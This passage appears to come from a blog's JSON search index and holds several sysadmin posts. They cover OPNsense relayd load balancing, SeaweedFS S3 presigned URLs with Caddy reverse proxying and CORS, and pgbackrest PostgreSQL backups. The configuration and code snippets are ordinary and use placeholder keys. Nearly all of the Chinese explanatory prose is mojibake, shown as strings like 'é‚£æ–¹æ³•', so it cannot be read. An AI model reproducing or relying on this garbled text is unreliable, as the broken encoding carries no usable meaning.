src=\"/posts/20251014-opnsense_relayd/image-20251014091045980.png\"\u003e\u003c/p\u003e\n\u003cp\u003eé‚£æ–¹æ³•æœ‰å¾ˆå¤šï¼Œå„æœ‰åˆ©å¼Šï¼Œå…ˆè¯´ç¬¬ä¸€ä¸ªï¼Œ\u003ccode\u003erelayd\u003c/code\u003eçš„åšæ³•\u003c/p\u003e\n\u003cp\u003erelaydæ˜¯æœ€æ—©çš„OPNsenseçš„æ’ä»¶ï¼Œç”¨æ¥åšè´Ÿè½½å‡è¡¡ï¼Œå®‰è£…è¿™ä¸ªpluginæ’ä»¶\u003c/p\u003e\n\u003cp\u003eé…ç½®å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eGeneral Settingsï¼š\u003c/p\u003e\n\u003cp\u003eç”±äºè™šæœºçš„cpuæ˜¯4ä¸ªï¼Œæ‰€ä»¥è¿›ç¨‹è®¾ç½®æˆ4\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091310004\" loading=\"lazy\" src=\"/posts/20251014-opnsense_relayd/image-20251014091310004.png\"\u003e\u003c/p\u003e\n\u003cp\u003eBackend Hosts:\u003c/p\u003e\n\u003cp\u003eåç«¯èŠ‚ç‚¹æœ‰4ä¸ªï¼Œåªå†™IPå³å¯\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091420120\" loading=\"lazy\" src=\"/posts/20251014-opnsense_relayd/image-20251014091420120.png\"\u003e\u003c/p\u003e\n\u003cp\u003eTable Checksï¼š\u003c/p\u003e\n\u003cp\u003eç«¯å£æ£€æŸ¥ï¼Œå› ä¸ºæ˜¯ç›´é€šï¼Œæ‰€ä»¥å°±è®¾ç½®æˆTCPæ£€æŸ¥å³å¯\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091530055\" loading=\"lazy\" src=\"/posts/20251014-opnsense_relayd/image-20251014091530055.png\"\u003e\u003c/p\u003e\n\u003cp\u003eTablesï¼š\u003c/p\u003e\n\u003cp\u003eHostsé€‰ä¸­4ä¸ªèŠ‚ç‚¹\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091611417\" loading=\"lazy\" src=\"/posts/20251014-opnsense_relayd/image-20251014091611417.png\"\u003e\u003c/p\u003e\n\u003cp\u003eVirtual Serverï¼š\u003c/p\u003e\n\u003cp\u003e80å’Œ443å„æœ‰ä¸€ä¸ª\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091724429\" loading=\"lazy\" src=\"/posts/20251014-opnsense_relayd/image-20251014091724429.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæ¯ä¸ªå‘¢ï¼Œè®¾ç½®å¥½å‰é¢çš„ç›‘å¬åœ°å€å’Œç«¯å£ï¼Œåç«¯çš„Table æœåŠ¡å™¨å’ŒTable checkçš„åè®®ï¼Œå°±okäº†\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091927383\" loading=\"lazy\" src=\"/posts/20251014-opnsense_relayd/image-20251014091927383.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæœ€åå» General Settings é€‰ä¸­ Enable Relaydï¼Œç„¶åsaveï¼Œå°±å¯ä»¥äº†\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014092113972\" loading=\"lazy\" src=\"/posts/20251014-opnsense_relayd/image-20251014092113972.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè¿™ä¹ˆå¤šè´´å›¾ï¼Œæ˜¯å› ä¸ºå¦‚æœä»CLIé…ç½®ï¼Œå…¶å®å°±ä¸€ä¸ªå¾ˆç®€å•çš„relayd.confæ–‡æœ¬æ–‡ä»¶\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ä»GUIï¼Œå°±ä¸€å¤§å †ï¼Œè€Œä¸”ç”Ÿæˆçš„ä¸œè¥¿ç®€ç›´ä¸çŸ¥æ‰€äº‘\u003c/p\u003e\n\u003cp\u003eè¿™æ ·åšrelaydå°±ç›¸å½“äºä¸€ä¸ªç›´é€šçš„LoadBalanceï¼ŒæŠŠæµé‡é€å…¥åç«¯çš„Nginx ingressæ‰€å¼€çš„NodePortã€‚\u003c/p\u003e\n\u003cp\u003eè¿™æ ·å°±å¯ç”¨äº†ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™æ ·æœ‰ä¸ªå¼Šç«¯ï¼ŒNginxçš„ingressæ‹¿ä¸åˆ°å®¢æˆ·ç«¯çš„çœŸå®IPï¼ŒX-forwarded-foræ— æ³•ä¼ è¿‡æ¥çœŸçš„å®¢æˆ·ç«¯IPï¼Œç½‘ä¸ŠæŸ¥æ–‡æ¡£æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯ä»GUIé…äº†åŠå¤©ï¼Œä¹Ÿä¸çŸ¥é“æ€ä¹ˆé…ï¼Œæœäº†ä¹Ÿæ˜¯ã€‚\u003c/p\u003e","title":"OPNsenseå¦‚ä½•åšLoadBalanceæ¥å…¥åç«¯çš„Kubernetes nginx ingress --- relaydç¯‡"},{"content":"SeaweedFS å·²ç»ç”¨docker composeçš„æ–¹å¼éƒ¨ç½²åœ¨ç”Ÿäº§ç¯å¢ƒå†…ä¸­äº†ï¼Œå¯¹å¤–åªå¼€æ”¾äº†ä¸€ä¸ªS3çš„ç«¯å£127.0.0.1:8333ï¼Œç„¶åå‰é¢å¥—ä¸ŠCaddyçš„httpsä»£ç†ï¼Œè¿™æ ·å¾ˆå®‰å…¨äº†ã€‚\né‚£è¿›é˜¶çš„è¦æ±‚åˆæ¥äº†ï¼š\nä¸€ã€S3çš„pre signedçš„URL ç”±äºç¨‹åºä¹‹å‰æ˜¯åœ¨AWSè·‘çš„ï¼Œæ‰€ä»¥ç”¨äº†S3çš„æœ€ä½³å®è·µï¼Œpre sign urlæ¥è¿›è¡Œä¸Šä¼ å’Œä¸‹è½½ï¼Œé‚£seaweedfsä¹Ÿæ˜¯å®Œå…¨æ”¯æŒçš„ï¼ŒåŸºæœ¬æ˜¯æ— ç¼ä¿®æ”¹\nç»™å‡ºéªŒè¯ç¨‹åºï¼š\nimport boto3 from botocore.client import Config # Configure the S3 client to point to your SeaweedFS S3 gateway s3_client = boto3.client( \u0026#39;s3\u0026#39;, endpoint_url=\u0026#39;https://s3.rendoumi.com\u0026#39;, # Replace with your SeaweedFS S3 gateway address aws_access_key_id=\u0026#39;aaaaaaaa\u0026#39;, aws_secret_access_key=\u0026#39;bbbbbbb\u0026#39;, config=Config(signature_version=\u0026#39;s3v4\u0026#39;) ) bucket_name = \u0026#39;myfiles\u0026#39; object_key = \u0026#39;your-object-key\u0026#39; expiration_seconds = 3600 # URL valid for 1 hour # Generate a pre-signed URL for uploading (PUT) try: upload_url = s3_client.generate_presigned_url( \u0026#39;put_object\u0026#39;, Params={\u0026#39;Bucket\u0026#39;: bucket_name, \u0026#39;Key\u0026#39;: object_key, \u0026#39;ContentType\u0026#39;: \u0026#39;application/octet-stream\u0026#39;}, ExpiresIn=expiration_seconds ) print(f\u0026#34;Pre-signed URL for upload: {upload_url}\u0026#34;) except Exception as e: print(f\u0026#34;Error generating upload URL: {e}\u0026#34;) # Generate a pre-signed URL for downloading (GET) try: download_url = s3_client.generate_presigned_url( \u0026#39;get_object\u0026#39;, Params={\u0026#39;Bucket\u0026#39;: bucket_name, \u0026#39;Key\u0026#39;: object_key}, ExpiresIn=expiration_seconds ) print(f\u0026#34;Pre-signed URL for download: {download_url}\u0026#34;) except Exception as e: print(f\u0026#34;Error generating download URL: {e}\u0026#34;) èƒ½çœ‹åˆ°ä¸´æ—¶ç”Ÿæˆçš„uploadçš„URLå’Œdownloadçš„URLï¼Œæ˜¯å®Œç¾æ”¯æŒçš„\näºŒã€s3çš„åŸŸåä»£ç† é‚£awsçš„s3æ¡¶é»˜è®¤æ˜¯æœ‰ä¸ªåŸŸåçš„bucket.ap-southease-1\u0026hellip;\u0026hellip;ï¼Œå‰é¢ä¹Ÿå¯ä»¥å¥—ä¸ŠCloudfrontæŠŠæ¡¶åšæˆé™æ€ç½‘ç«™çš„CDN\né‚£è¿ç§»çš„è¯ï¼Œåšæ³•ä¹Ÿæœ‰ä¸¤ç§ï¼Œä¸€æ˜¯CDNå‚å®¶ç›´æ¥æ”¯æŒæºç«¯æ˜¯S3æ¡¶ï¼Œé‚£è¿™ç§å°±å¥½åŠäº†ï¼Œç›´æ¥é…ç½®å³å¯\nç¬¬äºŒç§å°±æ˜¯æ²¡æœ‰è¿™åŠŸèƒ½ï¼Œé‚£åªèƒ½æŠŠseaweedfsçš„filterçš„æš´éœ²å‡ºæ¥ï¼Œç„¶åè®©CDNå‚å®¶httpå›æº\né‚£åšæ³•ä¹Ÿå¾ˆç®€å•ï¼Œä¿®æ”¹docker -compose.yamlæ”¾å¼€8888ç«¯å£\nservices: seaweedfs-s3: image: chrislusf/seaweedfs container_name: seaweedfs-s3 volumes: - ./data:/data - ./config/config.json:/seaweedfs/config.json ports: - \u0026#34;127.0.0.1:8333:8333\u0026#34; - \u0026#34;127.0.0.1:8888:8888\u0026#34; entrypoint: /bin/sh -c command: | \u0026#34;echo \u0026#39;Starting SeaweedFS S3 server\u0026#39; \u0026amp;\u0026amp; \\ weed server -dir=/data -volume.max=100 -s3 -s3.config /seaweedfs/config.json\u0026#34; restart: unless-stopped ç„¶åç”¨Caddyè¿›è¡Œåä»£ï¼ŒCaddyfileå¦‚ä¸‹ï¼š\ns3.rendoumi.com { reverse_proxy 127.0.0.1:8333 } mybucket.s3.rendoumi { rewrite * /buckets/mybucket{uri} reverse_proxy http://127.0.0.1:8888 } ä¸Šé¢æœ‰ä¸€ç‚¹è¦æ³¨æ„ï¼Œseaweedfsæš´æ¼å‡ºçš„8888ç«¯å£å¯ä»¥çœ‹åˆ°æ‰€æœ‰æ¡¶ï¼Œéƒ½åœ¨/bucketsä¸‹ï¼Œæˆ‘ä»¬åªæƒ³æš´æ¼mybucketçš„è¯ï¼Œå°±éœ€è¦å¯¹urlè¿›è¡Œæ”¹å†™ã€‚\nä¸‰ã€s3çš„cors ç¨‹åºé‡Œå±…ç„¶è¿˜ç”¨åˆ°äº†s3çš„coreï¼Œé‚£æ¯”è¾ƒéº»çƒ¦äº†ï¼Œä¸‡å¹¸çš„æ˜¯seaweedfså±…ç„¶ä¹Ÿæ”¯æŒï¼ï¼ï¼\né“¾æ¥ï¼šhttps://github.com/seaweedfs/seaweedfs/wiki/S3-CORS\næˆ‘ä»¬åªé™åˆ¶ mybucket çš„æ¡¶çš„corsï¼Œå…ˆå‡†å¤‡ä¸€ä¸ªcors.xmlæ–‡ä»¶\n\u0026lt;CORSConfiguration\u0026gt; \u0026lt;CORSRule\u0026gt; \u0026lt;AllowedOrigin\u0026gt;https://www.rendoumi.com\u0026lt;/AllowedOrigin\u0026gt; \u0026lt;AllowedOrigin\u0026gt;https://mybucket.rendoumi.com\u0026lt;/AllowedOrigin\u0026gt; \u0026lt;AllowedOrigin\u0026gt;https://*.rendoumi.com\u0026lt;/AllowedOrigin\u0026gt; \u0026lt;AllowedOrigin\u0026gt;https://mybucket.fcdn.net\u0026lt;/AllowedOrigin\u0026gt; \u0026lt;AllowedMethod\u0026gt;GET\u0026lt;/AllowedMethod\u0026gt; \u0026lt;AllowedMethod\u0026gt;POST\u0026lt;/AllowedMethod\u0026gt; \u0026lt;AllowedMethod\u0026gt;PUT\u0026lt;/AllowedMethod\u0026gt; \u0026lt;AllowedMethod\u0026gt;HEAD\u0026lt;/AllowedMethod\u0026gt; \u0026lt;AllowedMethod\u0026gt;DELETE\u0026lt;/AllowedMethod\u0026gt; \u0026lt;AllowedHeader\u0026gt;*\u0026lt;/AllowedHeader\u0026gt; \u0026lt;ExposeHeader\u0026gt;ETag\u0026lt;/ExposeHeader\u0026gt; \u0026lt;ExposeHeader\u0026gt;Access-Control-Allow-Origin\u0026lt;/ExposeHeader\u0026gt; \u0026lt;MaxAgeSeconds\u0026gt;3600\u0026lt;/MaxAgeSeconds\u0026gt; \u0026lt;/CORSRule\u0026gt; \u0026lt;/CORSConfiguration\u0026gt; è¿™ä¸ªæ˜¯çœŸæ— è¯­ï¼Œå› ä¸ºminioçš„mcåªæ”¯æŒè¿™ä¸ªæ¨¡å¼ï¼Œä¸æ”¯æŒjsonï¼ˆæˆ–è€…æ˜¯è‡ªå·±æ²¡æ‰¾åˆ°jsonçš„é…æ³•ï¼‰\nç„¶åç”¨mcæ¨è¿›å»å³å¯\nmc cors set mys3/mybucket /data/weedfs/cors.xml mc cors get mys3/mybucket è¿™æ ·å°±æå®šäº†ã€‚\n","permalink":"https://rendoumi.com/posts/20250917-seaweedfs_prod/","summary":"\u003cp\u003eSeaweedFS å·²ç»ç”¨docker composeçš„æ–¹å¼éƒ¨ç½²åœ¨ç”Ÿäº§ç¯å¢ƒå†…ä¸­äº†ï¼Œå¯¹å¤–åªå¼€æ”¾äº†ä¸€ä¸ªS3çš„ç«¯å£127.0.0.1:8333ï¼Œç„¶åå‰é¢å¥—ä¸ŠCaddyçš„httpsä»£ç†ï¼Œè¿™æ ·å¾ˆå®‰å…¨äº†ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£è¿›é˜¶çš„è¦æ±‚åˆæ¥äº†ï¼š\u003c/p\u003e\n\u003ch5 id=\"ä¸€s3çš„pre-signedçš„url\"\u003eä¸€ã€S3çš„pre signedçš„URL\u003c/h5\u003e\n\u003cp\u003eç”±äºç¨‹åºä¹‹å‰æ˜¯åœ¨AWSè·‘çš„ï¼Œæ‰€ä»¥ç”¨äº†S3çš„æœ€ä½³å®è·µï¼Œpre sign urlæ¥è¿›è¡Œä¸Šä¼ å’Œä¸‹è½½ï¼Œé‚£seaweedfsä¹Ÿæ˜¯å®Œå…¨æ”¯æŒçš„ï¼ŒåŸºæœ¬æ˜¯æ— ç¼ä¿®æ”¹\u003c/p\u003e\n\u003cp\u003eç»™å‡ºéªŒè¯ç¨‹åºï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport boto3\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efrom botocore.client import Config\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Configure the S3 client to point to your SeaweedFS S3 gateway\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003es3_client\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e boto3.client\u003cspan class=\"o\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s1\"\u003e\u0026#39;s3\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eendpoint_url\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;https://s3.rendoumi.com\u0026#39;\u003c/span\u003e,  \u003cspan class=\"c1\"\u003e# Replace with your SeaweedFS S3 gateway address\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eaws_access_key_id\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;aaaaaaaa\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eaws_secret_access_key\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;bbbbbbb\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003econfig\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eConfig\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003esignature_version\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;s3v4\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ebucket_name\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;myfiles\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eobject_key\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;your-object-key\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eexpiration_seconds\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e3600\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# URL valid for 1 hour\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Generate a pre-signed URL for uploading (PUT)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etry:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eupload_url\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e s3_client.generate_presigned_url\u003cspan class=\"o\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s1\"\u003e\u0026#39;put_object\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eParams\u003c/span\u003e\u003cspan class=\"o\"\u003e={\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Bucket\u0026#39;\u003c/span\u003e: bucket_name, \u003cspan class=\"s1\"\u003e\u0026#39;Key\u0026#39;\u003c/span\u003e: object_key, \u003cspan class=\"s1\"\u003e\u0026#39;ContentType\u0026#39;\u003c/span\u003e: \u003cspan class=\"s1\"\u003e\u0026#39;application/octet-stream\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eExpiresIn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eexpiration_seconds\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s2\"\u003e\u0026#34;Pre-signed URL for upload: {upload_url}\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eexcept Exception as e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s2\"\u003e\u0026#34;Error generating upload URL: {e}\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Generate a pre-signed URL for downloading (GET)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etry:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003edownload_url\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e s3_client.generate_presigned_url\u003cspan class=\"o\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s1\"\u003e\u0026#39;get_object\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eParams\u003c/span\u003e\u003cspan class=\"o\"\u003e={\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Bucket\u0026#39;\u003c/span\u003e: bucket_name, \u003cspan class=\"s1\"\u003e\u0026#39;Key\u0026#39;\u003c/span\u003e: object_key\u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eExpiresIn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eexpiration_seconds\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s2\"\u003e\u0026#34;Pre-signed URL for download: {download_url}\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eexcept Exception as e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s2\"\u003e\u0026#34;Error generating download URL: {e}\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eèƒ½çœ‹åˆ°ä¸´æ—¶ç”Ÿæˆçš„uploadçš„URLå’Œdownloadçš„URLï¼Œæ˜¯å®Œç¾æ”¯æŒçš„\u003c/p\u003e","title":"seaweedfsçš„s3è¿›é˜¶è¯•ç”¨æ–¹æ³•"},{"content":"æœ€è¿‘ç‹ æŠ˜è…¾äº†ä¸€é€špostgresçš„å¤‡ä»½ï¼Œè·ŸMySQLçš„é˜¿é‡ŒRDBæ¢å¤ä¸€æ ·ï¼Œå¦‚ä½•ä¸åœæ­¢æ•°æ®åº“æœåŠ¡ï¼Œæ¢å¤æŸä¸ªè¡¨çš„æ•°æ®åˆ°æŸä¸ªæ—¶é—´ç‚¹ï¼Œç„¶åæ”¾åˆ°å¦ä¸€ä¸ªè¡¨ä¸­å‘¢ï¼Ÿ\nå…¶å®ç”¨ä¹‹å‰çš„walæ¢å¤ä¸€æ ·çš„ï¼Œå°±æ˜¯è¦æŠŠå½“å¤©å®ä¾‹çš„å…¨å¤‡ä»½å’Œwaléƒ½å¤åˆ¶åˆ°å¦å¤–ä¸€å°ä¸Šï¼Œç„¶åæ¢å¤ï¼Œå†æŠŠæ•°æ®ç»™dumpä¸‹æ¥ï¼Œå†å»ºä¸€ä¸ªæ–°è¡¨ï¼ŒæŠŠæ•°æ®å¯¼å›å»ã€‚\nPostgresçš„walå’ŒPITRæ—¶é—´ç‚¹æ¢å¤\nç”¨pgbackrestæ„Ÿè§‰ä¼šå¥½ä¸€äº›ï¼Œå…¶å®éƒ½å·®ä¸å¤šï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€å®‰è£…å¹¶é…ç½®pgbackrest apt install pgbackrest # å»ºç«‹å¤‡ä»½çš„å¤§æœ¬è¥ mkdir -p /var/lib/pgbackrest chmod 750 /var/lib/pgbackrest chown postgres:postgres /var/lib/pgbackrest # ç¼–è¾‘ /etc/pgbackrest.conf [global] repo1-path=/var/lib/pgbackrest repo1-retention-full=26 repo1-retention-archive=180 log-level-file=info log-level-console=info [global:archive-push] compress-level=3 [main] pg1-path=/var/lib/postgresql/13/main pg1-port=5432 è®²è§£ä¸€ä¸‹å‚æ•°\nglobalé‡Œé¢æ˜¯å…¨å±€é…ç½®\nrepo1-path=/var/lib/pgbackrest # pgBackRest å­˜å‚¨åº“è·¯å¾„ repo1-retention-full=26 # ä¿ç•™æœ€è¿‘çš„ 26 ä¸ªå…¨é‡å¤‡ä»½ï¼Œå¤§æ¦‚6ä¸ªæœˆï¼Œ180å¤© repo1-retention-archive=180 # ä¿ç•™æœ€è¿‘ 180 å¤©çš„ WAL æ—¥å¿— log-level-file=info # æ–‡ä»¶æ—¥å¿—çº§åˆ« log-level-console=info # æ§åˆ¶å°æ—¥å¿—çº§åˆ« global:archive-push è®¾ç½®çš„æ˜¯walå½’æ¡£çš„ä¿å­˜æ–¹å¼æ˜¯å‹ç¼©ä¿å­˜\nmainéƒ¨åˆ†è®¾ç½®çš„æ˜¯è¦å¤‡ä»½çš„postgresæºçš„è·¯å¾„å’Œç«¯å£ï¼Œã€mainã€‘æ˜¯stanzaçš„åå­—\nä¸Šé¢çš„å¤‡ä»½å…¶å®æœ‰ä¸‰ç§å¤‡ä»½ï¼Œfullå’Œincrå’Œwalå¤‡ä»½ï¼Œé‚£å¦‚æœfullå’Œå¢é‡éƒ½æ²¡äº†ï¼Œåªè¦walè¿˜åœ¨ï¼Œé‚£ä¹ˆä¾ç„¶èƒ½æ¢å¤åˆ°180å¤©ä¹‹å†…çš„æŸä¸ªæ—¶é—´ç‚¹ã€‚walå¾ˆå ç©ºé—´ï¼Œfullä¹Ÿå¾ˆå ç©ºé—´ï¼Œä¸€å®šè¦ç®—å‡†äº†ã€‚\né‚£å…¶å®pgbackrestæ˜¯ç”¨postgresèº«ä»½å»æ‰§è¡Œå‘½ä»¤çš„ï¼Œæ‰€ä»¥ä¸ç”¨è®¤è¯èº«ä»½ã€‚\näºŒã€é…ç½®postgres vi /etc/postgresql/13/main/postgresql.conf # walå½’æ¡£æ–¹æ³•ï¼š #archive_mode = on #archive_command = \u0026#39;cp %p /data/backup/%f\u0026#39; # pgbackrestå½’æ¡£æ–¹æ³•ï¼š archive_mode = on archive_command = \u0026#39;pgbackrest --stanza=main archive-push %p\u0026#39; wal_level = replica #å¤‡ä»½çº§åˆ«æ˜¯å‰¯æœ¬ max_wal_senders = 3 #æœ€å¤šwalæ—¥å¿—å‘åˆ°3ä¸ªå®¢æˆ·ç«¯å» # éœ€è¦é‡å¯postgres systemctl restart postgresql ä¸‰ã€æµ‹è¯•pgbackrestçš„å¤‡ä»½åŠŸèƒ½ # å»ºç«‹ä¸€ä¸ªstanza sudo -u postgres pgbackrest --stanza=main --log-level-console=info stanza-create # æ£€æŸ¥ sudo -u postgres pgbackrest --stanza=main --log-level-console=info check # æŸ¥çœ‹ä¿¡æ¯ sudo -u postgres pgbackrest info çœ‹åˆ°å¦‚ä¸Šä¿¡æ¯å°±okäº†ã€‚\nå››ã€æ­£å¼çš„fullå’Œincrå¤‡ä»½ å…¨é‡å¤‡ä»½çš„è„šæœ¬full.shï¼š\n#!/bin/bash # è®¾ç½® pgBackRest çš„ç›¸å…³å‚æ•°å’Œå˜é‡ PG_BACKREST_COMMAND=\u0026#34;/usr/bin/pgbackrest\u0026#34; STANZA=\u0026#34;main\u0026#34; LOG_FILE=\u0026#34;/var/log/pgbackrest_full_backup.log\u0026#34; # æ‰§è¡Œå…¨é‡å¤‡ä»½ sudo -u postgres ${PG_BACKREST_COMMAND} --stanza=${STANZA} --log-level-console=info backup --type=full \u0026gt;\u0026gt; ${LOG_FILE} 2\u0026gt;\u0026amp;1 # æ£€æµ‹å¤‡ä»½æ˜¯å¦æˆåŠŸ if [ $? -eq 0 ]; then echo \u0026#34;$(date \u0026#39;+%Y-%m-%d %H:%M:%S\u0026#39;) - Full Backup Completed 